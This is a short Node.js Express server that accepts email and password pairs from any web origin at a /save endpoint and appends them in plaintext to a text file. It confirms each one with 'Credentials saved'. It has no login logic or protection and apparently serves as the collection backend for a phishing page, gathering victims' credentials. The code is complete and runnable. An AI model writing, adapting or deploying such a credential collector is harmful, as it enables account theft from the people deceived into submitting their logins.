const fs = require('fs');
const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

app.post('/save', (req, res) => {
    const { email, password } = req.body;
    const data = `Email: ${email}\nPassword: ${password}\n\n`;

    fs.appendFile('marevenche.txt', data, (err) => {
        if (err) {
            console.error(err);
            res.status(500).send('Error saving credentials');
        } else {
            res.send('Credentials saved');
        }
    });
});

app.listen(3000, () => console.log('Server running on port 3000'));
